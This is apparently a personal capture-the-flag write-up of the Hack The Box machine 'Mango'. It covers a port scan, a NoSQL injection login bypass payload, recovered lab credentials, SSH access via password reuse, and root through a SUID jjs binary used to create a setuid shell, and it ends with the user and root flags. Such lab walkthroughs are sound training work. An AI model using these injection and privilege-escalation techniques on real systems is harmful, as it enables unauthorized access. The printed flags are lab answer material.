# Scan

```bash
ghost@localhost [17:20:53] [~/Documents/hacking/tj-null-boxes/mango] [master *]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.162:22
Open 10.10.10.162:80
Open 10.10.10.162:443

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a88fd96fa6e4ee56e3ef54546d560cf5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYCdNRHET98F1ZTM+H8yrD9KXeRjvIk9e78JkHdzcqCq6zcvYIqEZReb3FSCChJ9mxK6E6vu5xBY7R6Gi0V31dx0koyaieEMd67PU+9UcjaAujbDS3UgYzySN+c5GV/ssmA6wWHu4zz+k+qztqdYFPh0/TgrC/wNPWHOKdpivgoyk3+F/retyGdKUNGjypXrw6v1faHiLOIO+zNHorxB304XmSLEFswiOS8UsjplIbud2KhWPEkY4s4FyjlpfpVdgPljbjijm7kcPNgpTXLXE51oNE3Q5w7ufO5ulo3Pqm0x+4d+SEpCE4g0+Yb020zK+JlKsp2tFJyLqTLan1buN
|   256 6a1cba891eb0572ffe63e1617289b4cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqSZ4iBMzBrw2lEFKYlwO2qmw0WPf76ZhnvWGK+LJcHxvNa4OQ/hGuBWCjVlTcMbn1Te7D8jGwPgbcVpuaEld8=
|   256 9070fb6f38aedc3b0b316864b04e7dc9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1sFdLYacK+1f4J+i+NCAhG+bj8xzzydNhqA1Ndo/xt
80/tcp  open  http     syn-ack Apache httpd 2.4.29
|_http-title: 403 Forbidden
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797d14d485feac35cc62fedbb7a2ce6
| SHA-1: b3299eca2892af1b5895053bf30e861f1c03db95
| -----BEGIN CERTIFICATE-----
| MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
| VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO
| TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct
| b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw
| HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x
| DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy
| diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h
| bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2
| f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V
| G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA
| 9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL
| 2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr
| arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw
| UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b
| BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF
| AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9
| HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ
| JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ
| YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB
| Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP
| /UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==
|_-----END CERTIFICATE-----
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Mango.htb (443)

Found https://mango.htb/analytics.php at the home page.

The site seems to be broken. Also looking through SSL cert, I found another domain

```
Common Name (CN) staging-order.mango.htb
Organisation (O) Mango Prv Ltd.
Organisational Unit (OU) None

Common Name (CN) staging-order.mango.htb
Organisation (O) Mango Prv Ltd.
Organisational Unit (OU) None
```


# staging-order.mango.htb

It seems to be a login page. With NoSQL injection, I can bypass the login page.

```bash
username[$ne]=admin&password[$ne]=admin&login=login
```

But `/home.php` is empty so I use gobuster to try and find more urls.

So I wrote a script to enumerate users/password and found 2 credentials.
- **admin**:**t9KcS3>!0B#2**
- **mango**:**h3mXK8RhU~f{]f5H**


# User

I tried password reuse with `mango` user, and got SSH access into the server. I tried `admin` for SSH and it failed.

```bash
ghost@localhost [22:19:34] [~/Documents/hacking/tj-null-boxes/mango] [master]
-> % ssh mango@mango.htb

mango@mango:~$ ls /home
admin  mango
```

There's user `admin` but cannot SSH into it. It is either the password is different or password login is disabled for this user for SSH.

So within the user `mango` I tried again and it works. So that means the user `admin` cannot login via password with SSH.

```bash
mango@mango:~$ su admin
Password:
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)

$ bash

admin@mango:/home/admin$ cat user.txt
75893d3317b636904a9df5412cbfedd4
```


# Privilege escalation

So I look for SUID files.

```bash
admin@mango:/home/admin$ find / -perm /4000 2> /dev/null | grep -v "snap/core"
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

From the list found 2 SUIDs that are interesting (run-mailcap, jjs).

According to GTFO bin, we can use those 2 can be used to execute commands as root.

```bash
admin@mango:/home/admin$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
0
jjs> exit()

admin@mango:/home/admin$ /tmp/sh -p
# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)

# whoami
root

# ls /root
root.txt

# cat /root/root.txt
4e2f50c21d8e40bc391dc87d6a43c0d4
```
